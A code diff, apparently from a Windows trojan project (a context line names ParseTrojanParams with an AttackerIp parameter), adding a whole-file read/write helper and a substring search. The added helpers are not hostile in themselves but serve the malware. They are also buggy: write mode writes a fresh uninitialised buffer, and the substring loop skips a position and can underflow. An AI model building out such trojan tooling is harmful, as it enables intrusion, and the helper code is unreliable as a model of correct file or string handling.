@@ -201,3 +201,56 @@ void ParseTrojanParams(LPVOID ParamBuffer, char* TargetIp, char* AttackerIp, cha
 		BufferIndex++;
 	}
 }
+
+
+int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite) {
+	DWORD OperationOutput = 0;
+	if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
+		return -1;
+	}
+	if (IsWrite) {
+		*FileHandle = CreateFileA(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	}
+	else {
+		*FileHandle = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	}
+	if (*FileHandle == INVALID_HANDLE_VALUE) {
+		return 1;  // Invalid handle
+	}
+	*FileDataSize = GetFileSize(*FileHandle, 0);
+	if (*FileDataSize == 0) {
+		CloseHandle(*FileHandle);
+		return 2;  // File size = 0
+	}
+	*FileData = malloc(*FileDataSize);
+	if (*FileData == NULL) {
+		CloseHandle(*FileHandle);
+		return 3;  // Malloc failed
+	}
+	if ((!IsWrite && (!ReadFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
+		OperationOutput != *FileDataSize)) ||
+		(IsWrite && (!WriteFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
+			OperationOutput != *FileDataSize))) {
+		CloseHandle(*FileHandle);
+		free(*FileData);
+		return 4;  // Actual operation failed
+	}
+	CloseHandle(*FileHandle);
+	return 0;
+}
+
+
+int GetIndexOfSubstringInString(char* MainString, char* SubString) {
+	if (MainString == NULL || SubString == NULL) {
+		return -1;
+	}
+	for (int StringIndex = 0; StringIndex < strlen(MainString) - strlen(SubString); StringIndex++) {
+		if (RtlCompareMemory(SubString, (PVOID)((ULONG64)MainString + StringIndex),
+			strlen(SubString)) == strlen(SubString)) {
+			return StringIndex;
+		}
+	}
+	return -1;
+}
